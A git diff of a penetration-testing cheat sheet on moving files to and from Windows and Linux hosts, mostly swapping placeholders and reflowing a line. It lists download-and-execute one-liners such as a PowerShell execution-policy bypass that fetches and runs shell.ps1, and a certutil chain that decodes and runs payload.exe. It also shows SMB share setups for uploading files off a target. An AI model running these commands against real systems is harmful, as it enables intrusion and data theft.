@@ -4,9 +4,9 @@
 
 ```bash
 certutil.exe -urlcache [-split] -f <source> <destn>
-PS> wget <source> -OutFile <dest>
-PS> Invoke-WebRequest -Uri <source> -Outfile <dest>
-powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
+powershell wget <source> -OutFile <dest>
+powershell Invoke-WebRequest -Uri <source> -Outfile <dest>
+powershell -c (New-Object System.Net.WebClient).downloadFile('SOURCE', 'DESTN')
 powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')
 certutil.exe -urlcache -split -f <source> payload.b64 & certutil.exe -decode payload.b64 payload.exe & payload.exe
 bitsadmin /transfer job <source> <dest>
@@ -16,9 +16,9 @@ wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309
 impacket-smbserver [-smb2support] drive .
 
 # on windows to copy (download)
-copy \\IP\drive\file
+copy \\IP\drive\FILE
 # upload 
-copy file \\IP\drive\
+copy FILE \\IP\drive\
 
 # mount smb-share-drive on windows using powershell
 PS> New-PSDrive -Name "winDrive" -PSProvider "FileSystem" -Root "\\IP\drive"
@@ -27,7 +27,7 @@ Navigating to "winDrive" shows us all files
 # upload dir (with all in it)
 robocopy dir \\IP\drive\ /E
 [OR]
-net use Z: \\IP\drive /u:<username> <pass>
+net use Z: \\IP\drive /u:USER PASS
 copy file Z:\
 ```
 
@@ -77,7 +77,8 @@ net use * http://IP/
 
 ## Curl function (linux only)
 
-Use when system does not have `wget, curl.`NOTE: works for binary files too. Fails for `https://` with self signed certificates.
+Use when system does not have `wget, curl.`NOTE: works for binary files too. Fails for `https://` with self signed
+certificates.
 
 ```bash
 function __curl() {
